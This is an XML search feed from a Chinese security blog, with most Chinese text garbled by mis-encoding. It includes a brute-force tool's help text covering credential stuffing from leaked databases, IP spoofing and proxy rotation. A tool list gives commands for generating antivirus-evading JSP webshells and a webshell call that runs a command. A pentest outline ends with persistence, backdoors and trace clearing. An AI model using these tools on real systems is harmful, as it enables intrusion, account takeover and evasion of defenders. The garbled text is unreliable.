´,å‡å°è´¦å·è¢«é”å®šå‡ ç‡</span><br><span class="line"></span><br><span class="line">Dictionary:</span><br><span class="line">  -d Param=DictFile [Param=DictFile ...]</span><br><span class="line">                        ä¸ºå‚æ•°è®¾ç½®å­—å…¸æ–‡ä»¶, æ”¯æŒäºŒæ¬¡å¤„ç†å‚æ•°å€¼</span><br><span class="line">                        e.g. -d user=users.dic pass=md5(pass.dic)</span><br><span class="line">                        é«˜çº§ç”¨æˆ·å¯è‡ªå†™pythonå‡½æ•°å¤„ç†å‚æ•°ï¼Œlib/value_process.py</span><br><span class="line">                        e.g. -d user=users.dic pass=capitalize(pass.dic)</span><br><span class="line"></span><br><span class="line">Detect:</span><br><span class="line">  --no302               302è·³è½¬ä¸æ•æ„Ÿ, é»˜è®¤æ•æ„Ÿï¼Œè§†ä¸ºç ´è§£æˆåŠŸæ ‡è®°</span><br><span class="line">  --fail Fail [Fail ...]</span><br><span class="line">                        ç ´è§£å¤±è´¥æ—¶çš„æ­£æ–‡æ ‡è®°,å¯ä»¥æ˜¯å¤šä¸ª</span><br><span class="line">                        e.g. --fail &quot;user not exist&quot; &quot;password wrong&quot;</span><br><span class="line">  --suc Suc [Suc ...]   ç ´è§£æˆåŠŸæ—¶çš„æ­£æ–‡æ ‡è®°,å¯ä»¥æ˜¯å¤šä¸ª</span><br><span class="line">                        e.g. --suc &quot;welcome,&quot; &quot;logout&quot;</span><br><span class="line">  --header-fail HeaderFail</span><br><span class="line">                        ä½äºHTTPå¤´ä¸­çš„ç ´è§£å¤±è´¥æ ‡è®°</span><br><span class="line">  --header-success HeaderSuccess</span><br><span class="line">                        ä½äºHTTPå¤´ä¸­çš„ç ´è§£æˆåŠŸæ ‡è®°</span><br><span class="line">  --retry-txt RetryText</span><br><span class="line">                        å½“è¯¥æ–‡æœ¬å‡ºç°æ—¶ï¼Œè§†ä¸ºå½“å‰è¯·æ±‚æ— æ•ˆï¼Œä¼šå†æ¬¡é‡è¯•</span><br><span class="line">                        e.g. --retry-txt=&quot;IP blocked&quot;</span><br><span class="line">  --retry-no-txt RetryNoText</span><br><span class="line">                        å½“è¯¥æ–‡æœ¬æ²¡æœ‰å‡ºç°æ—¶ï¼Œè§†ä¸ºå½“å‰è¯·æ±‚æ— æ•ˆï¼Œä¼šå†æ¬¡é‡è¯•</span><br><span class="line">                        e.g. --retry-no-txt=&quot;&lt;body&gt;&quot;</span><br><span class="line">  --retry-header RetryHeader</span><br><span class="line">                        å½“è¯¥æ–‡æœ¬å‡ºç°åœ¨HTTPå¤´æ—¶ï¼Œè§†ä¸ºå½“å‰è¯·æ±‚æ— æ•ˆï¼Œä¼šå†æ¬¡é‡è¯•</span><br><span class="line">                        e.g. --retry-header=&quot;Set-Cookie:&quot;</span><br><span class="line">  --retry-no-header RetryNoHeader</span><br><span class="line">                        å½“è¯¥æ–‡æœ¬æ²¡æœ‰å‡ºç°åœ¨HTTPå¤´æ—¶ï¼Œè§†ä¸ºå½“å‰è¯·æ±‚æ— æ•ˆï¼Œä¼šå†æ¬¡é‡è¯•</span><br><span class="line">                        e.g. --retry-no-header=&quot;HTTP/1.1 200 OK&quot;</span><br><span class="line"></span><br><span class="line">Proxy and Spoof:</span><br><span class="line">  --proxy Proxy         å‘½ä»¤è¡Œè®¾å®šè‹¥å¹²ä»£ç†æœåŠ¡å™¨</span><br><span class="line">                        e.g. --proxy=1.2.3.4:8000, 5.6.7.8:8000</span><br><span class="line">  --proxy-file ProxyFile</span><br><span class="line">                        é€šè¿‡æ–‡ä»¶å¯¼å…¥è‹¥å¹²ä»£ç†æœåŠ¡å™¨</span><br><span class="line">                        e.g. --proxy-file=proxies.txt</span><br><span class="line">  --check-proxy         æ ¡éªŒHTTPä»£ç†æœåŠ¡å™¨æ˜¯å¦å·¥ä½œæ­£å¸¸</span><br><span class="line">  --fake-ip             ä¼ªé€ HTTPå¤´ X-Forwarded-Forï¼Œå°è¯•ä¼ªé€ æºIP</span><br><span class="line">  --fake-sid FakeSID    ä¼ªé€ session ID</span><br><span class="line">  --sleep Seconds       è¯·æ±‚å®Œæˆåå»¶æ—¶Nç§’ï¼Œå‡å°è¢«æœåŠ¡å™¨å°ç¦IPçš„å‡ ç‡</span><br><span class="line"></span><br><span class="line">Database attack:</span><br><span class="line">  --database param1,parma2=file</span><br><span class="line">                        å¯¼å…¥ç¤¾å·¥åº“è¿›è¡Œæ’åº“æµ‹è¯•</span><br><span class="line">                        e.g. --database user,pass=csdn.txt</span><br><span class="line">  --regex REGEX         æŒ‰è¡Œæ­£åˆ™æå–å‚æ•°å€¼. e.g. --regex=&quot;(\S+)\s+(\S+)&quot;</span><br><span class="line"></span><br><span class="line">General:</span><br><span class="line">  -t Threads            å¹¶å‘å·¥ä½œçº¿ç¨‹ï¼Œé»˜è®¤50</span><br><span class="line">  --allow-redirect      å…è®¸Follow 30xè°ƒæ•´ï¼Œé»˜è®¤ç¦æ­¢</span><br><span class="line">  -o OutFile            è¾“å‡ºæ–‡ä»¶åã€‚ é»˜è®¤ä¸ºï¼š _proxy.servers.txt æˆ– _cracked.accounts.txt</span><br><span class="line">  --debug               è¿›å…¥è°ƒè¯•æ¨¡å¼ï¼Œè§‚å¯Ÿç¨‹åºè¡Œä¸º</span><br><span class="line">  --silent              å‡å°‘ç¨‹åºè¾“å‡ºï¼Œåªè¾“å‡ºç ´è§£æˆåŠŸçš„æ¡ç›®</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>çˆ†ç ´</tag>
      </tags>
  </entry>
  <entry>
    <title>èµ„äº§æ”¶é›†å·¥å…·æ•´ç†</title>
    <url>/2021/11/10/%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p>æ•´ç†ä¸€ä¸‹è¿™å‡ å¤©ç¾¤é‡Œè¹²åˆ°å¸ˆå‚…ä»¬åˆ†äº«çš„å·¥å…·</p>
<span id="more"></span>

<h3 id="domain-hunter-pro"><a href="#domain-hunter-pro" class="headerlink" title="domain hunter pro"></a><a href="https://github.com/bit4woo/domain_hunter_pro">domain hunter pro</a></h3><p>è¿™æ˜¯ä¸€ä¸ªbpçš„æ’ä»¶ï¼Œåªéœ€ä½¿ç”¨bræä¾›çš„ä»£ç†è®¿é—®ç½‘ç«™å°±å¯ä»¥å®ç°èµ„äº§çš„è‡ªåŠ¨æŒ–æ˜åŠŸèƒ½ï¼Œ</p>
<p>è¿˜æ•´åˆäº†ä¸€äº›å³é”®å¿«æ·èœå•ï¼Œå¯¼å‡ºåŠŸèƒ½å’Œä¸€äº›å·¥å…·</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636513135613-2021-11-1010:58:55.png"></p>
<h3 id="JSPHorse"><a href="#JSPHorse" class="headerlink" title="JSPHorse"></a><a href="https://github.com/EmYiQing/JSPHorse">JSPHorse</a></h3><p>è¿™ä¸ªç®—æ˜¯åˆ©ç”¨å·¥å…·ï¼Œç”¨æ¥ç”Ÿæˆjspçš„å…æ€é©¬çš„</p>
<p>ç”Ÿæˆæ ‡å‡†å½¢å¼åŸºç¡€Webshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JSPHorse.jar -p your_password</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆèšå‰‘çš„å…æ€Webshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JSPHorse.jar -p your_password --ant</span><br></pre></td></tr></table></figure>

<p>å…¨å±€Unicodeç¼–ç ï¼ˆJSPæ”¯æŒå…¨å±€Unicodeç¼–ç ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JSPHorse.jar -p your_password -u</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆè¿›é˜¶ç‰ˆWebshellï¼ˆJavacåŠ¨æ€ç¼–è¯‘classï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JSPHorse.jar -p your_password --super</span><br></pre></td></tr></table></figure>

<p>è¿›é˜¶ç‰ˆWebshellåŸºç¡€ä¸Šå…¨å±€Unicodeç¼–ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JSPHorse.jar -p your_password --super -u</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ScriptEngineè°ƒç”¨JSå…æ€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JSPHorse.jar -p your_password --js</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ScriptEngineè°ƒç”¨JSå…æ€åŸºç¡€ä¸Šå…¨å±€Unicodeç¼–ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JSPHorse.jar -p your_password --js -u</span><br></pre></td></tr></table></figure>

<p>å¦‚ä½•ä½¿ç”¨ï¼Ÿ</p>
<p><code>1.jsp?pwd=your_password&amp;cmd=calc.exe</code></p>
<h3 id="Allin"><a href="#Allin" class="headerlink" title="Allin"></a><a href="https://github.com/P1-Team/AlliN">Allin</a></h3><p>ä¸€ä¸ªè¾…åŠ©å¹³å¸¸æ¸—é€æµ‹è¯•é¡¹ç›®æˆ–è€…æ”»é˜²é¡¹ç›®å¿«é€Ÿæ‰“ç‚¹çš„ç»¼åˆå·¥å…·    </p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636514144744-2021-11-1011:15:44.png"></p>
<p>å¸¸ç”¨çš„å‚æ•°è®°å½•ä¸€ä¸‹ï¼Œå…·ä½“çš„ç›´æ¥-hå°±èƒ½çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python AlliN.py --host &quot;xxx.com&quot; -m infoscan</span><br></pre></td></tr></table></figure>

<p><code>-m</code>æ”¯æŒçš„å‚æ•°æœ‰</p>
<ol>
<li>infoscan æ‰«ä¿¡æ¯</li>
<li>fscanã€€ç”¨fofaé…åˆ-qå‚æ•°ï¼Œå‚æ•°å†…å®¹æ˜¯fofaè¯­æ³•</li>
<li>pscan æ‰«ç«¯å£</li>
<li>tscanã€€æ‰«æ ‡é¢˜ï¼Œé»˜è®¤</li>
<li>subscanã€€å­åŸŸå</li>
<li>backscanã€€åå°</li>
<li>oxidã€€ç›®æ ‡ä¸»æœºç½‘å¡</li>
</ol>
<h3 id="LiqunKit"><a href="#LiqunKit" class="headerlink" title="LiqunKit"></a>LiqunKit</h3><p>è¿™æœ¬æ¥æ˜¯ä¸€ä¸ªæ¼æ´åˆ©ç”¨çš„å·¥å…·ï¼Œä½†è¿™ä¸ªjaråŒ…ä¸çŸ¥ä¸ºä»€ä¹ˆæ²¡è·‘èµ·æ¥ï¼Œè¯•äº†åŠå¤©ï¼Œçœ‹äº†issueæœ‰å’Œæˆ‘ä¸€æ ·çš„é—®é¢˜ï¼Œä½†æˆ‘javaç‰ˆæœ¬ä¹Ÿæ˜¯1.8çš„ï¼ŒjaråŒ…åå­—ä¹Ÿæ²¡ä¿®æ”¹è¿‡ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¼šä¸è¡Œï¼Œæä¸ªissueé—®ä¸‹å§</p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>å·¥å…·</tag>
        <tag>èµ„äº§æ”¶é›†</tag>
      </tags>
  </entry>
  <entry>
    <title>éƒ¨ç½²åšå®¢hexo+stun</title>
    <url>/2021/11/03/%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2hexo-stun/</url>
    <content><![CDATA[<h1 id="éƒ¨ç½²hexo-stun"><a href="#éƒ¨ç½²hexo-stun" class="headerlink" title="éƒ¨ç½²hexo+stun"></a>éƒ¨ç½²hexo+stun</h1><p>ç”¨Github Pages + HexoæŠ˜è…¾ä¸ªåšå®¢ç©    </p>
<p>è¸©äº†å‡ ä¸ªå‘ï¼ŒGithub pageé‚£è¸©äº†ä¸€ä¸ªï¼ˆä»“åº“åæ˜¯<code>githubç”¨æˆ·å.github.io</code>ï¼‰ï¼Œnpmçš„æ—¶å€™è¸©äº†ä¸€ä¸ª</p>
<h2 id="éƒ¨ç½²æµç¨‹"><a href="#éƒ¨ç½²æµç¨‹" class="headerlink" title="éƒ¨ç½²æµç¨‹"></a>éƒ¨ç½²æµç¨‹</h2><ol>
<li><p>ç¯å¢ƒå‡†å¤‡ï¼Œéœ€è¦æœ‰node,gitç¯å¢ƒ(å¹¶ä¸”é…å¥½ssh-key)</p>
</li>
<li><p>å®‰è£…hexo <code>sudo npm install -g hexo-cli</code></p>
<p><strong>é™¤è¿™ä¹‹å¤–éƒ½ä¸èƒ½å…¨å±€å®‰è£…</strong></p>
</li>
<li><p>åˆå§‹åŒ–hexo <code>hexo init LycsBlog</code></p>
</li>
<li><p>å¯¼èˆªåˆ°åšå®¢ç›®å½•<code>cd LycsBlog</code></p>
</li>
<li><p>å®‰è£…ä¾èµ–<code>sudo npm installã€€--registry https://registry.npm.taobao.org</code></p>
</li>
<li><p>è‡ªåŠ¨éƒ¨ç½²æ’ä»¶<code>sudo npm install hexo-deployer-git --save</code></p>
</li>
<li><p>é…ç½®ä¸‹<code>_config.yml</code>çš„<code>deploy</code>å‚æ•°ï¼Œä»“åº“åœ°å€å’Œtype <a href="https://hexo.io/zh-cn/docs/one-command-deployment">é…ç½®å®˜ç½‘</a></p>
</li>
<li><p>æ ¹æ®è¿™ä¸ª<a href="https://github.com/liuyib/hexo-theme-stun/">stunä¸»é¢˜</a>çš„å®‰è£…è¿›è¡Œé…ç½®</p>
</li>
</ol>
<ul>
<li><p>å¸¸ç”¨hexoå‘½ä»¤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean #ã€€æ¸…ç†</span><br><span class="line">hexo g #ã€€ç”Ÿæˆé™æ€æ–‡ä»¶</span><br><span class="line">hexo s #ã€€å¯åŠ¨æœ¬åœ°æœåŠ¡å™¨</span><br><span class="line">hexo d #ã€€éƒ¨ç½²åˆ°githubä»“åº“</span><br><span class="line">hexo new &#x27;title&#x27; #ã€€æ–°å»ºåšæ–‡ï¼Œä¼šåœ¨source/_posts/ç”Ÿæˆä¸€ä¸ªmd</span><br></pre></td></tr></table></figure></li>
</ul>
<p>å¥½äº†ï¼Œç¬¬ä¸€ç¯‡å°±æ°´ç©äº†,é‡æ–°å¯ç”¨äº†ä»¥å‰æ²¡æ¢ç³»ç»Ÿå‰åœ¨windowsåœ¨giteeä¸Šæå¾—å›¾åºŠï¼Œæ•´ä¸ªå›¾</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/piapiapia-2021-11-318:25:54.gif"></p>
]]></content>
      <categories>
        <category>æŠ˜è…¾hexo</category>
      </categories>
  </entry>
  <entry>
    <title>é’é¾™é¢æ¿+jdè–…ç¾Šæ¯›</title>
    <url>/2021/11/20/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF-jd%E8%96%85%E7%BE%8A%E6%AF%9B/</url>
    <content><![CDATA[<p>å‘¨å…­äº†ï¼Œæ•´ç‚¹èŠ±æ´»ï¼Œè–…ä¸€æ³¢ç¾Šæ¯›</p>
<span id="more"></span>

<h2 id="ä½¿ç”¨docker-composeå®‰è£…é’é¾™é¢æ¿"><a href="#ä½¿ç”¨docker-composeå®‰è£…é’é¾™é¢æ¿" class="headerlink" title="ä½¿ç”¨docker-composeå®‰è£…é’é¾™é¢æ¿"></a>ä½¿ç”¨docker-composeå®‰è£…é’é¾™é¢æ¿</h2><blockquote>
<p>è¿™ä¸ªé¢æ¿å°±æ˜¯ç”¨æ¥æ‰§è¡Œå®šæ—¶ä»»åŠ¡çš„</p>
<p>å‚è€ƒå®˜æ–¹ä»“åº“<a href="https://github.com/whyour/qinglong">https://github.com/whyour/qinglong</a></p>
</blockquote>
<ol>
<li>docker-compose å®‰è£…</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo curl -L https://github.com/docker/compose/releases/download/1.16.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…å›½å†…çš„æ‹‰å¾—æ…¢å¯ä»¥åœ¨githubçš„ç½‘å€å‰é¢åŠ ä¸€ä¸ªé•œåƒ<code>http://ghproxy.com</code></p>
<ol start="2">
<li>å¯åŠ¨å®¹å™¨</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir qinglong</span><br><span class="line">wget https://raw.githubusercontent.com/whyour/qinglong/develop/docker-compose.yml</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> å¯åŠ¨</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"><span class="meta">#</span><span class="bash"> åœæ­¢</span></span><br><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>



<h2 id="é…ç½®é’é¾™é¢æ¿é€šçŸ¥"><a href="#é…ç½®é’é¾™é¢æ¿é€šçŸ¥" class="headerlink" title="é…ç½®é’é¾™é¢æ¿é€šçŸ¥"></a>é…ç½®é’é¾™é¢æ¿é€šçŸ¥</h2><p>ç„¶åè®¿é—®<code>htpp://your_vps_ip:5700</code></p>
<p>é…ç½®è¿‡ç¨‹ä¸­æˆ‘æ¨é€é€‰æ‹©äº†ä¼ä¸šå¾®ä¿¡çš„åº”ç”¨ï¼Œ</p>
<p>å…¶ä¸­éœ€è¦é…å‡ ä¸ªå‚æ•°</p>
<h3 id="è·å–access-token"><a href="#è·å–access-token" class="headerlink" title="è·å–access_token"></a>è·å–access_token</h3><p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637384970495-2021-11-2013:09:30.png"></p>
<ul>
<li><p>corpidå¯ä»¥åœ¨<a href="https://work.weixin.qq.com/wework_admin/frame#profile">ä¼ä¸šå¾®ä¿¡ç®¡ç†åå°</a> â€œæˆ‘çš„ä¼ä¸šâ€ï¼â€ä¼ä¸šidâ€é‡Œé¢æ‰¾åˆ°</p>
</li>
<li><p>corpsecretå°±æ˜¯åˆ›å»ºå¯¹åº”çš„ä¼ä¸šåº”ç”¨çš„secret</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637385261385-2021-11-2013:14:21.png"></p>
</li>
</ul>
<h3 id="è·å–userid"><a href="#è·å–userid" class="headerlink" title="è·å–userid"></a>è·å–userid</h3><p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637384694556-2021-11-2013:04:54.png"></p>
<p>ç„¶åæŒ‰ç…§ä»–æç¤ºçš„æ ¼å¼ç”¨åˆ†å·åˆ†å‰²å°±è¡Œ</p>
<h3 id="ä¸‹è½½è‡ªåŠ¨åŒ–è„šæœ¬"><a href="#ä¸‹è½½è‡ªåŠ¨åŒ–è„šæœ¬" class="headerlink" title="ä¸‹è½½è‡ªåŠ¨åŒ–è„šæœ¬"></a>ä¸‹è½½è‡ªåŠ¨åŒ–è„šæœ¬</h3><p>æˆ‘ç”¨çš„æ˜¯è¿™ä¸ªè„šæœ¬</p>
<p><a href="https://github.com/zero205/JD_tencent_scf/tree/main">https://github.com/zero205/JD_tencent_scf/tree/main</a></p>
<p>å› ä¸ºæˆ‘ç”¨çš„æ˜¯dockeréƒ¨ç½²ï¼Œæ‰€ä»¥å…ˆè¿›å…¥dockerå†…éƒ¨bash</p>
<ul>
<li><p>æŸ¥çœ‹å®¹å™¨åå«å•¥</p>
<p><code>docker ps</code></p>
</li>
<li><p>è¿›å…¥å®¹å™¨</p>
<p><code>docker exec -it qinglong_web_1 bash</code></p>
</li>
<li><p>ç„¶ååˆ©ç”¨é’é¾™çš„cliæŠŠç›®æ ‡jsè„šæœ¬åº“æ‹–ä¸‹æ¥</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ql repo https://github.com/zero205/JD_tencent_scf.git &quot;jd_|jx_|getJDCookie&quot; &quot;backUp|icon&quot; &quot;^jd[^_]|USER|sendNotify|sign_graphics_validate|JDJR|JDSign&quot; &quot;main&quot;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±å®Œæˆäº†ï¼Œé‡æ–°æ‰“å¼€webé¢æ¿å°±ä¼šæ‰¾åˆ°ä¸€è½¦å®šæ—¶ä»»åŠ¡</p>
<h2 id="é…ç½®äº¬ä¸œçš„cookie"><a href="#é…ç½®äº¬ä¸œçš„cookie" class="headerlink" title="é…ç½®äº¬ä¸œçš„cookie"></a>é…ç½®äº¬ä¸œçš„cookie</h2><p>æœ‰å¾ˆè¯¦ç»†çš„æ•™ç¨‹è·å–äº¬ä¸œçš„cookieï¼Œ<strong>æ³¨æ„éœ€è¦æ˜¯chroiumnå†…æ ¸çš„æµè§ˆå™¨å’Œè®¿é—®çš„æ˜¯<code>m.jd.com</code></strong></p>
<p>æˆ‘ç”¨firefoxæ²¡æ‰¾åˆ°å¯¹åº”çš„cookieé”®å€¼å¯¹</p>
<p><a href="https://github.com/zero205/JD_tencent_scf/blob/main/backUp/GetJdCookie.md">https://github.com/zero205/JD_tencent_scf/blob/main/backUp/GetJdCookie.md</a></p>
<p>æ‰¾åˆ°é”®å€¼å¯¹ä¹‹åå»é’é¾™çš„åå°æ·»åŠ ä¸€ä¸‹ç¯å¢ƒå˜é‡</p>
<p>é”®æ˜¯<code>JD_COOKIE</code>å€¼å°±æ˜¯æŒ‰ç…§ä¸Šé¢ç½‘å€è·å–ä¸‹æ¥çš„ä¸œè¥¿</p>
<p>è¿˜æœ‰ä¸€ä¸ªå°±æ˜¯ä»–çš„cookieæ˜¯æœ‰æœ‰æ•ˆæœŸçš„ï¼Œä½¿ç”¨æ‰‹æœºéªŒè¯ç ç™»å½•å¤§æ¦‚ä¸€ä¸ªæœˆå·¦å³ï¼Œä¹Ÿå°±æ˜¯åœ¨ä¸æ¸…é™¤æµè§ˆå™¨cookieå’Œé€€å‡ºæµè§ˆå™¨äº¬ä¸œå¸å·çš„æƒ…å†µä¸‹ä¸€ä¸ªæœˆåéœ€è¦é‡æ–°è·å–ä¸€æ¬¡cookie</p>
]]></content>
      <tags>
        <tag>æ‚</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¸—é€æµ‹è¯•æµç¨‹</title>
    <url>/2021/11/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="æ¸—é€æµ‹è¯•æµç¨‹"><a href="#æ¸—é€æµ‹è¯•æµç¨‹" class="headerlink" title="æ¸—é€æµ‹è¯•æµç¨‹"></a>æ¸—é€æµ‹è¯•æµç¨‹</h2><p>æ•´ç†ä¸€ä¸‹æ¸—é€æµ‹è¯•çš„æµç¨‹ï¼Œå¤‡å¿˜ï¼Œé•¿æœŸæ›´æ–°</p>
<span id="more"></span>

<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><ul>
<li><p>çœŸå®ip,ç½‘æ®µï¼ŒåŸŸå</p>
<p>whatweb</p>
</li>
<li><p>å¼€æ”¾ç«¯å£å¯¹åº”æœåŠ¡</p>
<p>nmap</p>
</li>
<li><p>å­åŸŸåæ”¶é›†</p>
<p>oneforall</p>
</li>
<li><p>whois</p>
</li>
<li><p>æ—ç«™ï¼Œcæ®µ</p>
<p>ladon</p>
</li>
<li><p>æ“ä½œç³»ç»Ÿä¿¡æ¯</p>
<p>wapplyzer,nmap</p>
</li>
<li><p>åº”ç”¨ä¿¡æ¯</p>
<p>wapplyzer</p>
<p>whatweb</p>
</li>
<li><p>ç½‘ç«™åå°</p>
<p>dirmap</p>
</li>
</ul>
<h3 id="æ¼æ´æ¢æµ‹ï¼†åˆ©ç”¨"><a href="#æ¼æ´æ¢æµ‹ï¼†åˆ©ç”¨" class="headerlink" title="æ¼æ´æ¢æµ‹ï¼†åˆ©ç”¨"></a>æ¼æ´æ¢æµ‹ï¼†åˆ©ç”¨</h3><ul>
<li>AWVS</li>
<li>vulmap</li>
<li>nessus</li>
<li>xray</li>
</ul>
<p>å‘ç°æ¼æ´åè¿›è¡Œåˆ©ç”¨ï¼š</p>
<h4 id="è‡ªåŠ¨åŒ–éªŒè¯ï¼šç»“åˆè‡ªåŠ¨åŒ–æ‰«æå·¥å…·æä¾›çš„ç»“æœã€‚"><a href="#è‡ªåŠ¨åŒ–éªŒè¯ï¼šç»“åˆè‡ªåŠ¨åŒ–æ‰«æå·¥å…·æä¾›çš„ç»“æœã€‚" class="headerlink" title="è‡ªåŠ¨åŒ–éªŒè¯ï¼šç»“åˆè‡ªåŠ¨åŒ–æ‰«æå·¥å…·æä¾›çš„ç»“æœã€‚"></a>è‡ªåŠ¨åŒ–éªŒè¯ï¼šç»“åˆè‡ªåŠ¨åŒ–æ‰«æå·¥å…·æä¾›çš„ç»“æœã€‚</h4><h4 id="è¯•éªŒéªŒè¯ï¼šè‡ªå·±æ­å»ºæ¨¡æ‹Ÿç¯å¢ƒè¿›è¡ŒéªŒè¯ã€‚"><a href="#è¯•éªŒéªŒè¯ï¼šè‡ªå·±æ­å»ºæ¨¡æ‹Ÿç¯å¢ƒè¿›è¡ŒéªŒè¯ã€‚" class="headerlink" title="è¯•éªŒéªŒè¯ï¼šè‡ªå·±æ­å»ºæ¨¡æ‹Ÿç¯å¢ƒè¿›è¡ŒéªŒè¯ã€‚"></a>è¯•éªŒéªŒè¯ï¼šè‡ªå·±æ­å»ºæ¨¡æ‹Ÿç¯å¢ƒè¿›è¡ŒéªŒè¯ã€‚</h4><h4 id="ç™»é™†çŒœè§£ï¼šçˆ†ç ´"><a href="#ç™»é™†çŒœè§£ï¼šçˆ†ç ´" class="headerlink" title="ç™»é™†çŒœè§£ï¼šçˆ†ç ´"></a>ç™»é™†çŒœè§£ï¼šçˆ†ç ´</h4><ul>
<li><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a></li>
<li><a href="https://github.com/yzddmr6/WebCrack">https://github.com/yzddmr6/WebCrack</a></li>
</ul>
<h4 id="ä¸šåŠ¡æ¼æ´éªŒè¯ï¼šå¦‚å‘ç°ä¸šåŠ¡æ¼æ´ï¼Œè¦è¿›è¡ŒéªŒè¯ã€‚"><a href="#ä¸šåŠ¡æ¼æ´éªŒè¯ï¼šå¦‚å‘ç°ä¸šåŠ¡æ¼æ´ï¼Œè¦è¿›è¡ŒéªŒè¯ã€‚" class="headerlink" title="ä¸šåŠ¡æ¼æ´éªŒè¯ï¼šå¦‚å‘ç°ä¸šåŠ¡æ¼æ´ï¼Œè¦è¿›è¡ŒéªŒè¯ã€‚"></a>ä¸šåŠ¡æ¼æ´éªŒè¯ï¼šå¦‚å‘ç°ä¸šåŠ¡æ¼æ´ï¼Œè¦è¿›è¡ŒéªŒè¯ã€‚</h4><h3 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h3><p>å†…ç½‘æµé‡ä»£ç†ï¼š<a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
<p>ladonã€€<a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p>
<p>ä¸‰å¤§æµ‹è¯•æ¡†æ¶ï¼š</p>
<p>Metasploitã€Empireã€Cobalt Strike</p>
<p><a href="https://xz.aliyun.com/t/3975">https://xz.aliyun.com/t/3975</a></p>
<h3 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h3><ul>
<li><p>windowsæƒé™ç»´æŒ</p>
<p>éšè—ï¼Œåé—¨</p>
</li>
<li><p>linuxæƒé™ç»´æŒ</p>
<p>éšè—ï¼Œåé—¨</p>
</li>
</ul>
<p><a href="https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E4%B8%89%E5%A4%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF.html">æƒé™ç»´æŒ</a></p>
<p>MSFæƒé™ç»´æŒ</p>
<p>Empireæƒé™ç»´æŒ</p>
<p>Cobalt Strikeæƒé™ç»´æŒ</p>
<h3 id="æ¸…ç†ç—•è¿¹"><a href="#æ¸…ç†ç—•è¿¹" class="headerlink" title="æ¸…ç†ç—•è¿¹"></a>æ¸…ç†ç—•è¿¹</h3>]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
      </tags>
  </entry>
</search>
